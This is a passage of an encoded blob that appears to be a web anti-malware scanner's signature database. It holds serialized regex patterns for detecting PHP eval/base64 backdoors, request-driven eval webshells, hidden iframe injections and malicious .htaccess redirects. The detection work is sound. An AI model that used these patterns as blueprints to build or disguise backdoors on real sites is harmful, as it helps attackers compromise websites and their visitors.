xzXHtdK3JldHVyblteO1=qO1tcc1x9XStvYl9zdGFydFwoXCk7XHMqXD8-LitcJHdwX3Jld3JpdGUtPmZsdXNoX3J1bGVzXChcKTtccyp3cF9jYWNoZV9mbHVzaFwoKVsiJ1xzXCk7XHNcfV=rKCR8XD8-KS9pcyI7fXM6NDE6ImlmIGlzc2V=IFJFUVVFU1QgdG91Y2ggbW92ZV91cGxvYWRlZF9maWxlIjthOjI6e2k6MDtzOjU6IkgzOUJwIjtpOjE7czozNDY6Ii8oKGlmW1woXHNcIV=rKChwcmVnX21hdGNoW1xzXChdK1teLF=rLFxzKik_XDh8KGlzc2V=fGVtcHR5KVtcc1woXStcJF8oUkVRVUVTVHxHRVR8UE9TVHxGSUxFUykpXHMqXFtbXlx7XStce1xzKigoXCRbYS16XzAtOV=rKVxzKj1bXjtdKztccyopKikrKGZvcmVhY2hccypcKFteXCldK1wpK1tcc1x7XSppZltcc1woXStbXlwpXStcKStccypjb25=aW51ZTtccyopPygoXCRbYS16XzAtOV=rKVxzKj18aWZccypcKCkqW1xzXEBdKihtb3ZlX3VwbG9hZGVkX2ZpbGV8dG91Y2h8XCRbYS16XzAtOV=rKVxzKlwoW15cO1=rOyhbXH1cc1=qKChcJFthLXpfMC=5XStccyo9fGVjaG8pW147XSs7XHMqKSopKyl7Mix9L2kiO319czo4OiJodGFjY2VzcyI7YToxNDp7czoyODoiZXhjZXNpdmUgc3BhY2VzIGluIC5odGFjY2VzcyI7YToyOntpOjA7czo1OiJFQTg3cCI7aToxO3M6MzE6Ii9bXHJcbl=rKFtcdCBdezMwfXxbXHRdezEwfSkuKi8iO31zOjI2OiJleGNlc2l2ZSB=YWJzIGluIC5odGFjY2VzcyI7YToyOntpOjA7czo1OiJFQTg4UyI7aToxO3M6MzI6Ii9eKFtcdCBdezMwfXxbXHRdezEwfSkuKltcclxuXSsvIjt9czoyMjoiUmV3cml=ZVJ1bGUgbW9iaWxlIDMwMiI7YToyOntpOjA7czo1OiJENDVFOSI7aToxO3M6MTM4OiIvUmV3cml=ZUVuZ2luZSBvbi4rP1Jld3JpdGVSdWxlIFxeW1woXT9cLlwqW1wpXT9cJCBodHRwOlwvXC8obW9iaWxlLS4rP3wuKz9jb3VudChlcik_XC5waHB8Lis_XD9oPVswLTldKykgXFsoTFwsKT9SKD1bMC=5XXszfSk_KFwsTCk_XF=vc2kiO31zOjI2OiJwaHBfdmFsdWUgYXV=b19hcHBlbmRfZmlsZSI7YToyOntpOjA7czo1OiJEM=M2RiI7aToxO3M6MzE6Ii9waHBfdmFsdWUgYXV=b19hcHBlbmRfZmlsZSAuKy8iO31zOjQ3OiJUYWdlZCBSZXdyaXRlQ29uZCBIVFRQX1JFRkVSRVIgUmV3cml=ZVJ1bGUgSFRUUCI7YToyOntpOjA7czo1OiJEM=o2dyI7aToxO3M6MTY3OiIvXCNbYS16QS1aMC=5XStcIy4rP1Jld3JpdGVFbmdpbmUgb25bXHJcbiBcdF=rUmV3cml=ZUNvbmQgXCVce=hUVFBfUkVGRVJFUlx9Lis_UmV3cml=ZVJ1bGUgXF5cKFwuXCpcKVwkIGh=dHA6XC9cLy4rPyBcWyhMXCwpP1I9WzAtOV17M3=oXCxMKT9cXS4rP1wjXC9bYS16QS1aMC=5XStcIy9zaSI7fXM6Mjc6IkVycm9yRG9jdW1lbnQgNDA=IHdwcHBtLnBocCI7YToyOntpOjA7czo1OiJEQkk2MCI7aToxO3M6MzI6Ii9FcnJvckRvY3VtZW5=IDQwNCAuK3dwcHBtXC5waHAvIjt9czo1NToiUmV3cml=ZUNvbmQgVVNFUl9BR=VOVCBSRUZFUkVSIFJld3JpdGVSdWxlIHN=YXJ=aW5nLnBocCI7YToyOntpOjA7czo1OiJFOEg5diI7aToxO3M6OTE6Ii8oUmV3cml=ZUNvbmQgXCVce=hUVFBfKFVTRVJfQUdFTlR8UkVGRVJFUilcfS4rW1xyXG5dKykrUmV3cml=ZVJ1bGUuKz9cL3N=YXJ=aW5nXC5waHBcPy4rL2kiO31zOjQ4OiJSZXdyaXRlQ29uZCBIVFRQX1VTRVJfQUdFTlQgUmV3cml=ZVJ1bGUgaHR=cCAucnUiO2E6Mjp7aTowO3M6NToiRjNSQlciO2k6MTtzOjEwNzoiLyhSZXdyaXRlRW5naW5lIG9uXHMrKT8oUmV3cml=ZUNvbmQgLio_SFRUUChcOnxfQUNDRVBUfF9VU=VSX=FHRU5UKS4qXHMrKStSZXdyaXRlUnVsZS4qPyBodHRwLis_XC5ydS4qXHMqL2kiO31zOjQ5OiJSZXdyaXRlQ29uZCBIVFRQX1VTRVJfQUdFTlQgUmV3cml=ZVJ1bGUgaHR=cCAucGhwIjthOjI6e2k6MDtzOjU6IkYyTzgwIjtpOjE7czo5NzoiLyhSZXdyaXRlQ29uZCBcJVx7SFRUUF9VU=VSX=FHRU5UXH=gLitccyspK1Jld3JpdGVSdWxlIFxeXCQgaHR=cDpcL1wvLis_KG1vYnkyNFwuY29tfFwucGhwXD8pLisvaSI7fXM6Nzk6IlJld3JpdGVFbmdpbmUgT24gUmV3cml=ZUJhc2UgUmV3cml=ZUNvbmQgUmV3cml=ZVJ1bGUgaW5kZXgucGhwIHBhc3NpbmcgdmFyaWFibGUiO2E6Mjp7aTowO3M6NToiRUNFOFMiO2k6MTtzOjE3NzoiL1Jld3JpdGVFbmdpbmUgT25ccytSZXdyaXRlQmFzZSBcLyhbYS16MC=5XF9cLV=rKVwvXHMrUmV3cml=ZVJ1bGUgXF5pbmRleFteXF1dK1xdXHMrKFJld3JpdGVDb25kIC4rXHMrKStSZXdyaXRlUnVsZSBcXlwoXC5cKlwpXCQgXC9cMVwvaW5kZXhcLnBocFw_W2EtejAtOVxfXC1dKz1cJDEgXFtbXlxdXStcXS9pIjt9czo2NDoiUmV3cml=ZUVuZ2luZSBvbiBSZXdyaXRlQ29uZCBIVFRQX1VTRVJfQUdFTlQgUmV3cml=ZVJ1bGUgaHR=cCBJUCI7YToyOntpOjA7czo1OiJHOUpBWSI7aToxO3M6MTkzOiIvKFJld3JpdGVFbmdpbmUgb25ccyspPyhSZXdyaXRlQ29uZCBcJVx7KFJFUVVFU1RfVVJJfEhUVFBfUkVGRVJFUnxIVFRQX1VTRVJfQUdFTlQpXH=oPyEgZmF2aWNvblwuaWNvIFxbKS4rXHMrKStSZXdyaXRlUnVsZSAuKiBodHRwOlwvXC8oPyExMjdcLnxcJVx7KEhUVFBfSE9TVHxSRU1PVEVfQUREUilcfXx3aWtpcGVkaWFcLm9yZykuKi9pIjt9czo=MjoiUmV3cml=ZUVuZ2luZSBvbiBVTkNPTkRJVElPTkFMIFJld3JpdGVSdWxlIjthOjI6e2k6MDtzOjU6IkgyS=FLIjtpOjE7czo3NjoiL1Jld3JpdGVSdWxlIFxeW15cc1=rXHMrLis_KD88IShpbmRleFxcfG1pbmlmeSkpXC5waHBcP1tePV=rPVtcJFwlXHtcXF=rLisvaSI7fXM6MTA5OiJSZXdyaXRlQ29uZCBFTlY6UkVESVJFQ1RfU1RBVFVTIFJld3JpdGVSdWxlIFJld3JpdGVDb25kIFJFRkVSRVIvVVNFUl9BR=VOVCBnb29nbGUveWFob28vYmluZyBSZXdyaXRlUnVsZSAucGhwIjthOjI6e2k6MDtzOjU6IkcxNEJNIjtpOjE7czoyNjM6Ii9SZXdyaXRlQ29uZFxzK1wlXHtFTlZcOlJFRElSRUNUX1NUQVRVU1x9XHMrMjAwXHMrUmV3cml=ZVJ1bGVbXF5cLVxzXStcW1teXF1dK1xdXHMrKFJld3JpdGVDb25kXHMrXCVce=hUVFBfKFJFRkVSRVJ8VVNFUl9BR=VOVClcfVxzK1woKChnb29nbGV8eWFob298bXNufGFvbHxiaW5nKShcfHxcKSkpKyhccytcW1teXF1dK1xdKSpccyspK1Jld3JpdGVSdWxlXHMrXF5cKFteXCldK1wpXCRccytbYS16X1wtMC=5XStcLnBocFw_XCQxXHMrW15cXV=rW1xdXHNdKy9pIjt9czoyMToiRGlyZWN=b3J5SW5kZXggIWluZGV4IjthOjI6e2k6MDtzOjU6Ikc1NEQ3IjtpOjE7czo3MzoiLyg_PD1EaXJlY3RvcnlJbmRleCApKD8haW5kZXguaHRtbCB8aW5kZXguaHRtICkoLis_KSg_PVteXC9daW5kZXhcLnBocCkvaSI7fX1zOjU6Imtub3duIjthOjE=Nzp7czozMzoiQ=9PS=lFIHByZWdfbWF=Y2ggZnVuY3Rpb25fZXhpc3RzIjthOjI6e2k6MDtzOjU6IkgxQ=RwIjtpOjE7czozMDU6Ii8oPFw_W3BoXHNdK2Z1bmN=aW9uXHMrKFthLXpfMC=5XSspW1xzXChdKyhcJFthLXpfMC=5XSspW1xzXClce1=rKFwkW2Etel8wLTldKylccyo9XHMqaW1wbG9kZVwoW147XSs7XHMqLis_KT9pZltcc1woXStpc3NldFtcc1woXStcJF9DT=9LSUVcWy4rPyhpZltcc1woXEBdK3ByZWdfbWF=Y2hcKC4rP2lmXFtcc1woXEBdK3ByZWdfbWF=Y2hcKC4rP2lmW1xzXChcQF=rZnVuY3Rpb25fZXhpc3RzXCguKz8oXHMrXH=pezN9fChlY2hvfHByaW5=fGRpZSlbXHNcKF=rXDJbXHNcKF=rYXJyYXlbXHNcKDAtOSxcKV=rO1xzKigkfFw_PikpL2lzIjt9czozMToic2NyaXB=IGdvb2dsZWJsb2djb25=YWluZXIgZXZhbCI7YToyOntpOjA7czo1OiJHQlI4TSI7aToxO3M6MTI2OiIvPHNjcmlwdFtePl=rKHNyYz1bJyJodHBzOl=rXC9cL2dvXC5bXlw_XStcPyh6b25lfGlkfHApKz1cZCtbJyJcJl1bXj5dKj58aWQ9Imdvb2dsZWJsb2djb25=YWluZXIiLitldmFsXCguKylccyo8XC9zY3JpcHQ-XHMqL2kiO31zOjIyOiJpbmNsdWRlIHBocDUucGhwIGFsb25lIjthOjI6e2k6MDtzOjU6IkY1TEJWIjtpOjE7czoxMDI6Ii88XD9bcGhcc1=raWZccypcKGlzW15cKV=rW1wpXHNce1=rXEA_aW5jbHVkZVwoKC4rP1wuaWNvfCdwaHA1XC5waHApWyInXVwpOyhccypkaWVbXjtdKjspP1tcc1x9XSpcPz4vaSI7fXM6Mjc6ImRvY3VtZW5=LndyaXRlIGlmcmFtZSBzbWFsbCI7YToyOntpOjA7czo1OiJFMkdDSCI7aToxO3M6MTYzOiIvKGRvY3VtZW5=XC53cml=ZVwoWyciXSk_PGlmcmFtZSBzcmM9WyciXWh=dHA6XC9cLyguKz8pKCAoaGVpZ2h=fHdpZHRoKT1bJyJdP1swLTVdWyciXT8pKyggc3R5bGU9WyciXXZpc2liaWxpdHk6W1x=IF=qaGlkZGVuW14-XSo-PFwvaWZyYW1lPnw-PFwvaWZyYW1lPlsnIl1cKSk7Ki9pIjt9czoyNzoiZG9jdW1lbnQud3JpdGUgaWZyYW1lIC5waHA1IjthOjI6e2k6MDtzOjU6IkQxRUp2IjtpOjE7czo2NToiL2RvY3VtZW5=XC53cml=ZVwoWyciXTxpZnJhbWUgLitsZWZ=XDpbIF=_LS4rPFwvaWZyYW1lPlsnIl1cKTsqL2kiO31zOjEwOiJhcnJheSBldmFsIjthOjI6e2k6MDtzOjU6IkczNklDIjtpOjE7czoyMzE6Ii8oZnVuY3Rpb25ccysoW2Etel8wLTldKylcKChbXjtdKls7XHNcfV=rKSs_cmV=dXJuW147XSpbO1xzXH1dKyk_KChcJFtcLVw-XC5hLXpfMC=5XSspXHMqPVxzKigoKFsnIl=pLipcOFtcLlxzXSopK3xhcnJheShfbWFwKSpccypcKFteXCldKltcKVxzXSsoLFteXCldKltcKVxzXSspKik7XHMqKStldmFsXHMqKFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyopKlwoLio_KFwyfFw1KS4qW1wpXHNdKzsvaSI7fXM6MjU6ImRvY3VtZW5=LndyaXRlIGlmcmFtZSAucnUiO2E6Mjp7aTowO3M6NToiRTlKSWMiO2k6MTtzOjcxOiIvKGRvY3VtZW5=XC53cml=ZVwofGVjaG8gKVsnIl=8aWZyYW1lIC4rXC5ydVwvLis8XC9pZnJhbWU-WyciXVsgXCk7XSsvaSI7fXM6ODoiZXZhbCBoZXgiO2E6Mjp7aTowO3M6NToiRzg5RjAiO2k6MTtzOjc4OiIvXEA_ZXZhbFxzKlwoW2Etel8wLTlcc1woXSooWyInXSlbXjtdKihcXCh4WzAtOWEtZl17Mn18XGQrKSkrW147XSpcMVtcKVxzXSo7L2kiO31zOjE5OiJmdW5jdGlvbl9leGlzdHMgZW1vIjthOjI6e2k6MDtzOjU6IkcyUzkxIjtpOjE7czo3NToiLzxcP1twaFxzXSooaWYgXChcIWZ1bmN=aW9uX2V4aXN=c1woJ2VtbydcKS4rZXhpdDtcfXx3cF9mb29=c1woXCk7KVxzKlw_Pi9pIjt9czozNDoiZnVuY3Rpb25fZXhpc3RzIGJhc2U2NF9kZWNvZGUgZXZhbCI7YToyOntpOjA7czo1OiJGNDdLVyI7aToxO3M6MTUwOiIvaWZccypcKFxzKlwhZnVuY3Rpb25fZXhpc3RzXHMqXCguK1tcKVxzXStbXHtcc1=qZnVuY3Rpb25ccypbYS16XF8wLTldK1woLitbXClcc1=rW1x7XHNcJGEtelxfMC=5XH1cc1w9XEBdKmJhc2U2NF9kZWNvZGVccypcKC4rZXZhbFxzKlwoLitbXCk7XHNcfV=rL2kiO31zOjI4OiJlY2hvIGd6aW5mbGF=ZSBiYXNlNjRfZGVjb2RlIjthOjI6e2k6MDtzOjU6IkgxTzk5IjtpOjE7czoxMTA6Ii9cI1thLXpfXC=9MC=5XStcI1tcc1xAXStlY2hvW1woXHNcQF=rZ3ppbmZsYXRlW1woXHNcQF=rYmFzZTY=X2RlY29kZVtcKFxzXSsuK1tcKVxzXSs7XHMqXCNcL1thLXpfXC=9MC=5XStcIy9pIjt9czoyMToicHJlZ19yZXBsYWNlIC9lIGFsb25lIjthOjI6e2k6MDtzOjU6IkY2TzlNIjtpOjE7czoyMDU6Ii88XD9bcGhcc1=qKChcQD9lcnJvcl9yZXBvcnRpbmdcKHxcKFwkW2EtelxfMC=5XStccyo9XHMqXCRfKFJFUVVFU3xHRXxQT1MpVFxbKVteXCldKltcKVwmO1xzXSspP1xAP3ByZWdfcmVwbGFjZVtcKCBcdF=rKFsnIl=pKFtcIVwvXCNcfFxAXCVcXlwqXH5dKS4rP1w1W2ltc3hdKmVbaW1zeF=qXDRbIFx=XSosW14sXSssW15cKV=rW1wpO1xzXSooXD8-fCQpL2kiO31zOjE5OiJwcmVnX3JlcGxhY2UgL2UgaGV4IjthOjI6e2k6MDtzOjU6IkgyTkVmIjtpOjE7czoyNTU6Ii8oKFwvezJ9Lip8XCRbYS16XzAtOV=rXHMqPS4rKVxzKikqXEA_KFwkW2Etel8wLTldK3xwcmVnX3JlcGxhY2UpXHMqXChccyooWyciXSkoW1whXC9cI1x8XEBcJVxeXCpcfl18XFxbeDAtOV17MSwzfSkuKz8oXDVbaW1zeF=qZVtpbXN4XSp8XFx4NjV8XFwxNDUpXDRccyosXHMqKFsnIl1cXHhbMC=5QS1GXXsyfXxbJyJdP1wkKD8hY2IsIFwkZW5jb2RlZF92YWx1ZVxbXCRrZXlcXVwpOykoPyFyZXBsXC4nOykpW14sXSssW15cKV=rW1wpO1xzXSovaSI7fXM6MzE6InByZWdfcmVwbGFjZSAvZSBzdHJfcmVwbGFjZSBoZXgiO2E6Mjp7aTowO3M6NToiRjZGSW4iO2k6MTtzOjE=NjoiL1xAP3ByZWdfcmVwbGFjZVxzKlwoXHMqWyciXS4rW1wvXCNcfF1baXNdKmVbaXNdKlsnIl1ccyosXHMqXEA_KFwkXyhSRVFVRVN8R=V8UE9TKVRcW3xzdHJfcmVwbGFjZVwoKFsnIlxzLFwuXCRdKlxceFswLTlBLUZdWzAtOUEtRl=pKykuKlwpW1xzO1=qL2kiO31zOjE3OiJldmFsIGZyb21DaGFyQ29kZSI7YToyOntpOjA7czo1OiJGOEdERiI7aToxO3M6Mjk3OiIvKDxzY3JpcHRbXj5dKj5ccyooKCh2YXJccyopP1thLXpfMC=5XStccyooO1xzKlthLXpfMC=5XStccyo9XHMqW2Etel8wLTldW1xzXC5dKmxlbmd=aHxbXC49XStccyooWyInXSkuKj9cNlxzKnxbLD1dK1xzKlxbW15cXV=qXF=rXHMqKSs7XHMqKStmb3JbXlx7XStce1xzKlteXH1dK2Zyb21DaGFyQ29kZVwoW15cfV=rW1x9XHNdKyhbYS16XzAtOV=rXHMqPVteO1=rO1xzKikqZG9jdW1lbnRcLndyaXRlXCh8ZXZhbFwoLipmcm9tQ2hhckNvZGVcKChccypbMC=5XStccyosKSspW147XSs7XHMqPFwvc2NyaXB=PlxzKikrL2kiO31zOjI1OiJpbmlfcmVzdG9yZSBiYXNlNjRfZGVjb2RlIjthOjI6e2k6MDtzOjU6IkgxT=5nIjtpOjE7czo5NzoiLzxcP1twaFxzXStpbmlfcmVzdG9yZVxzKlwoLitccysuK2Jhc2U2NF9kZWNvZGVccypcKC4rXHMrLitwaHBcLmluaS4rXHMrLitmd3JpdGVccypcKFtcU1xzXStcPz4vaSI7fXM6MTg6ImV2YWwgYmFzZTY=X2RlY29kZSI7YToyOntpOjA7czo1OiJHMTFEZiI7aToxO3M6Mjk4OiIvKFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyp8XC9cL1teXG5dKlxzKykqKFxAP2Vycm9yX3JlcG9ydGluZ1woW15cKV=qXCkrO1xzKi4rXHMqKT8oYmFzZTY=X2RlY29kZVwoLitccyopP1xAP2V2YWxccyooXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKnxcL1wvW15cbl=qXHMrKSpcKFteXCldKmJhc2U2NF9kZWNvZGVccyooXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKnxcL1wvW15cbl=qXHMrKSpcKFteXCldKyhcKVxzKihcL1wqW15cKl=qKFwqW15cKlwvXSopK1wvXHMqfFwvXC9bXlxuXSpccyspKikrOy9pIjt9czozMzoiZXJyb3JfcmVwb3J=aW5nIHZhcmlhYmxlLWZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkQ2QUFiIjtpOjE7czo5NDoiLzxcPyhwaHApP1tcclxuIFx=XSooXCRbYS16XF8wLTldKylbXHQgPV=rWyciXS4rWyciXVs7IFx=XStbXEBdP2Vycm9yX3JlcG9ydGluZ1woLitcMlwoLitcPz4vaSI7fXM6MTk6ImVjaG8gc2NyaXB=IGlmcmFtZSAiO2E6Mjp7aTowO3M6NToiSDFOOWQiO2k6MTtzOjEzOToiL1wjW2Etel9cLT=wLTldK1wjW1xzXEBdK2VjaG8uKzxzY3JpcHQuK1wuY3JlYXRlRWxlbWVudFtcKFxzIiddK2lmcmFtZS4rXC5zdHlsZVwuKGxlZnR8dG9wKT1bJyJcXF=rLS4rPFwvc2NyaXB=Pi4rO1xzK1wjXC9bYS16X1wtPTAtOV=rXCMvaSI7fXM6MTM6ImV2YWwgX1JFUVVFU1QiO2E6Mjp7aTowO3M6NToiRzFWOHEiO2k6MTtzOjE2NjoiL1tcQF=qKGVycm9yX3JlcG9ydGluZ1woLitiYXNlNjRfZGVjb2RlXCguKykqKD88IWwpZXZhbFsgXHRdKihcL1wqLipcKlwvKSpbIFx=XSpcKFsgXHRdKihcL1wqLipcKlwvKSpbIFx=XSpcJF8oUkVRVUVTfEdFfFBPUylUXFsuKz9cXS4qP1wpWyBcdF=qKFwvXCouKlwqXC8pKlsgXHRdKjsvaSI7fXM6MTg6ImZvcmVhY2ggZXZhbCBhcnJheSI7YToyOntpOjA7czo1OiJIMTRMNyI7aToxO3M6MjI5OiIvKFwvXCpccysoW2Etel9cLTAtOV=rKVxzKlwqXC9ccyp8PFw_W3BoXHNdKykoXCRbYS16XzAtOV=rKVxzKj1ccyphcnJheVteO1=rO1xzKi4rP2Z1bmN=aW9uIChbYS16XzAtOV=rKVwoLis_cmV=dXJuW147XSo7WztcfVxzXSsoXCRbYS16XzAtOV=rKVxzKj1ccypcNFxzKlwoXHMqXDNbXjtdKztccypldmFsXChcNVteO1=rWyciXClcfTtcc1=rKFwvXCpccytcL1wyXHMqXCpcL3wuKz8oJHxcPz4pKS9pIjt9czozMToiZXhjZXNpdmUgc3BhY2VzIGluIGhhc2hlZCBibG9jayI7YToyOntpOjA7czo1OiJDQ1Y4RiI7aToxO3M6NTc6Ii9cI1thLXpBLVowLTldK1wjW1xuIFx=XXs1MH=uK1tcbiBcdF=rXCNcL1thLXpBLVowLTldK1wjLyI7fXM6Mjk6IkphdmFzY3JpcHQgb2JzY3VyZSBldmFsIGFycmF5IjthOjI6e2k6MDtzOjU6IkgzQTlkIjtpOjE7czoyNDY6Ii8oXC9cKlxzKihbMC=5YS1mXXszMn=pXHMqXCpcL1xzKnw8KHNjcmlwdClbXj5dKj5ccyopKnZhclxzK1thLXpfMC=5XStccyo9KFxzKltcWyxdXHMqKFsnIl=pKFxcP3hbMC=5YS1mXXsyfSkqXDUpK1tcc1xdXSs7XHMqZG9jdW1lbnRccyooKFxbW15cXV=rW1xdXHNdKykrKFwoKFthLXpfMC=5XSsoXFtbXlxdXStbXF1cc1=rKSopKikrXCkrWztcc1=qKSsoXC9cKltcc1wvXSpcMlxzKlwqXC9ccyp8PFwvXDNbXj5dKj5ccyopKi9pcyI7fXM6MzA6IkphdmFTY3JpcHQgZnVuY3Rpb24geFZpZXdTdGF=ZSI7YToyOntpOjA7czo1OiJENzhMaiI7aToxO3M6MTA3OiIvPHNjcmlwdCBsYW5ndWFnZT1bJyJdSmF2YVNjcmlwdFsnIl=-W1xyXG4gXHRdKmZ1bmN=aW9uIFthLXowLTldK1ZpZXdTdGF=ZVwoXCkoLis_W1xyXG4gXHRdKikrPzxcL3NjcmlwdD4vaSI7fXM6Mjk6ImFkZC1kaXYtY29udGVudCBWaWFncmEgQ2lhbGlzIjthOjI6e2k6MDtzOjU6IkQ=NkhiIjtpOjE7czo4OToiLzxcIS=tc3RhcnQtYWRkLWRpdi1jb25=ZW5=WzAtOV=qLS=-LitWaWFncmEuK=NpYWxpcy4rPFwhLS1lbmQtYWRkLWRpdi1jb25=ZW5=WzAtOV=qLS=-L2kiO31zOjIxOiJqYXZhc2NyaXB=IGFycmF5IGV2YWwiO2E6Mjp7aTowO3M6NToiRUNMTlYiO2k6MTtzOjkwOiIvdmFyXHMqW19cLVw-XC5hLXowLTldK1xzKj1ccypcW1xzKlsnIl=oXFx4WzAtOUEtRl17Mn=pK1siJ11bXlxdXSpcXS4rP2V2YWxccypcKC4rP1wpKzsqL2kiO31zOjI=OiJpc3NldCBSRVFVRVNUIGV2YWwgYWxvbmUiO2E6Mjp7aTowO3M6NToiRjhHQk8iO2k6MTtzOjE1NDoiLzxcP1twaFxzXSsoXCRbX1wtXD5cLmEtejAtOV=rXHMqPVxzKihbJyJdKS4rP1wyO1xzKikqaWZbXHNcKF=rKFthLXpfMC=5XStccypcKFxzKikqXCRfKFJFUVVFU3xHRXxQT1MpVFxbLisoc3lzdGVtfGV2YWwpXCguK1xzKmV4aXRbXjtdKls7XHMqXH1dKygkfFw_PikvaSI7fXM6MzQ6Imlzc2V=IEhUVFBfVVNFUl9BR=VOVCBoZWFkZXIgYWxvbmUiO2E6Mjp7aTowO3M6NToiRDFPTkYiO2k6MTtzOjk4OiIvPFw_cGhwIGlmXChpc3NldFwoXCRfU=VSVkVSXFtbJyJdSFRUUF9VU=VSX=FHRU5UWyciXVxdLitoZWFkZXJcKFsnIl1Mb2NhdGlvbjogaHR=cDpcL1wvLis7XH1cPz4vaSI7fXM6MjU6InN=cnJldiBBc3NlcnQgZXZhbCBiYXNlNjQiO2E6Mjp7aTowO3M6NToiRDI=SUgiO2k6MTtzOjIyMDoiL1tcclxuIFx=XSsuKz9cKFsiJ1=oXFwxNDV8ZSkoXFwxNjZ8dikoXFwxNDF8YSkoXFwxNTR8bCkoXFwwNTB8XCgpKFxcMTQyfGIpKFxcMTQxfGEpKFxcMTYzfHMpKFxcMTQ1fGUpKFxcMDY2fDYpKFxcMDY=fDQpKFxcMTM3fF8pKFxcMTQ=fGQpKFxcMTQ1fGUpKFxcMTQzfGMpKFxcMTU3fG8pKFxcMTQ=fGQpKFxcMTQ1fGUpKFxcMDUwfFwoKS4rP1xcMDUxXFwwNTFcXDA3M1siJ11cKTsvaSI7fXM6MjQ6IlJldHJ5IGJhc2U2NF9kZWNvZGUgQ3VybCI7YToyOntpOjA7czo1OiJIMlJKTSI7aToxO3M6Mjc1OiIvPFw_W1xzaHBdKlxAP2Vycm9yX3JlcG9ydGluZ1woW1xzMF=rXCk7XHMqKChcJFthLXpfMC=5XStccyo9XHMqKT8odXJsZGVjb2RlW1xzXChdKyk_XCRfQ=9PS=lFXFtbXlxdXStcXStbXCk7XHNdKykrLittYWlsXChbXlwpXStcKStbXHNce1=rcG9zdF9zdGF=c1woKC4rP2Z1bmN=aW9uXHMrKHBvc3Rfc3RhdHN8X2hvc3QyaW5=fG1jaHxzbXRwX2xvb2t1cHxwb3N=X21jaCkpezV9Litzb2NrZXRfY2xvc2VcKFteXCldK1wpK1s7XHNcfV=rZGllXChcKTtbXHNcfV=qKCR8XD8-KS9pcyI7fXM6MjA6InByZWdfcmVwbGFjZSBhbGwgaGV4IjthOjI6e2k6MDtzOjU6IkY3MTRPIjtpOjE7czo1NjoiL1xAKnByZWdfcmVwbGFjZVxzKlwoKFteXCldKj9ceFswLTlBLUZdezJ9KXsxNSx9Lis_XCk7L2kiO31zOjE=OiJpZnJhbWUgaW4gaGVhZCI7YToyOntpOjA7czo1OiJENTNIUCI7aToxO3M6NTY6Ii9cPGlmcmFtZSAuK1w8XC9pZnJhbWVcPltcclxuIFx=XSooPz1cPFwvaCh=bWx8ZWFkKVw-KS9pIjt9czozNjoiVGFnZ2VkIHNjcmlwdCB=cnkgZG9jdW1lbnQuYm9keSBldmFsIjthOjI6e2k6MDtzOjU6IkcyR=RHIjtpOjE7czoxODc6Ii88XCEtLVthLXpfMC=5XHNdKy=tPlxzKjxzY3JpcHQgLis_KGJkdl9yZWZfcGlkPShbMC=5XSspOy4rPzxcL3NjcmlwdD5ccyo8c2NyaXB=IC4rP3BpZD1cMnx=cnlce2RvY3VtZW5=XC5ib2R5Lis_ZXZhbCkuKz88XC9zY3JpcHQ-XHMqKDxub3NjcmlwdC4rPFwvbm9zY3JpcHQ-XHMqKT88XCEtLVtcL2Etel8wLTlcc1=rLS=-L2kiO31zOjI5OiJUYWdnZWQgdHJ5IGRvY3VtZW5=LmJvZHkgZXZhbCI7YToyOntpOjA7czo1OiJEM=o3TiI7aToxO3M6OTE6Ii9cL1wqWzAtOWEtZl=rXCpcL1tcclxuIFx=XSsuKz9=cnlce2RvY3VtZW5=XC5ib2R5Lis_ZXZhbC4rP1tcclxuIFx=XStcL1wqXC9bMC=5YS1mXStcKlwvL2kiO31zOjM3OiJldmFsIHZhcmlhYmxlLWZ1bmN=aW9uIGxvbmctbmItc3RyaW5nIjthOjI6e2k6MDtzOjU6IkY2TURoIjtpOjE7czoxNDE6Ii8oKFwvXC8uK3xcJFthLXpcXzAtOVxbXF1ce1x9JyJdK1xzKj1bXlw7XSs7KVxzKikqXEA_KGV2YWx8YXNzZXJ=KVwoKFwkW2EtelxfMC=5XFtcXVx7XH=nIl=rXCgpK1snIl1bYS16QS1aMC=5XC9cX1wtXCtcPVxyXG5dezIwMCx9WyciXVwpKzsvaSI7fXM6NDE6ImZ1bmN=aW9uIG9iX2dldF9sZXZlbCBvYl9zdGFydCBhZGRfYWN=aW9uIjthOjI6e2k6MDtzOjU6IkQzTEE=IjtpOjE7czoxODg6Ii9pZiBcKFwhZnVuY3Rpb25cX2V4aXN=c1woLis_XCkgXHtbXHJcbiBcdF=rZnVuY3Rpb24gLis_XCkgXHtbXHJcbiBcdF=raWYgXChcIW9iXF9nZXRcX2xldmVsXChcKVwpIG9iXF9zdGFydFwoLis_XCk7W1xyXG4gXHRdK1x9W1xyXG4gXHRdKyguK1tcclxuIFx=XSspKyhhZGRfYWN=aW9uXCguKz9cKTtbXHJcbiBcdF=rKStcfS9pIjt9czoyNjoiaGVhZCBzY3JpcHQgZG9jdW1lbnQud3JpdGUiO2E6Mjp7aTowO3M6NToiRDNQRDUiO2k6MTtzOjYyOiIvKD88PVw8XC9oZWFkXD4pXDxzY3JpcHQuKz9kb2N1bWVudFwud3JpdGVcKC4rP1w8XC9zY3JpcHRcPi9zaSI7fXM6MTQ6InNjcmlwdCBodHRwIElQIjthOjI6e2k6MDtzOjU6IkczRzg4IjtpOjE7czoyNjc6Ii8oPzwhWyciXSk8c2NyaXB=W14-XSooc3JjPVsnIl=_aHR=cFtzXT9cOlwvKChbXC98XC5dWzAtOV=rKXs=fXxcL3d3d1wuYWRzcHRwXC5jb218XC9jZG5cLnBvcGNhc2hcLm5ldClcL3xjb2xsZWN=XC5qc3xcL3dwLWluY2x1ZGVzXC9qc1wvamNyb3BcL2pxdWVyeVwuanN8Pi4qaHR=cDpcL1wvbWJzLXN1cHBvcnRcLmNvbVwvanNcL2pxdWVyeVwubWluXC5waHAuKmRvY3VtZW5=XC53cml=ZVwoWyInXTxzY3JpcHQuKlwvc2NyaXB=KVtePl=qPi4qPzxcL3NjcmlwdD4vaSI7fXM6MTg6InNjcmlwdCBlbmNvZGUgZXZhbCI7YToyOntpOjA7czo1OiJFOTdHbyI7aToxO3M6MTA1OiIvPHNjcmlwdC4rPygoWzAtOUEtRnhdezIwMH18KFsnIl=_LFsiJ1=_WzAtOUEtRnhdKyl7MjAwfS4rP2V2YWwpfChldmFsLis_WzAtOSBcdFwsXXszMDB9KSkuKz88XC9zY3JpcHQ-L2kiO31zOjU=OiJUYWdnZWQgYmFz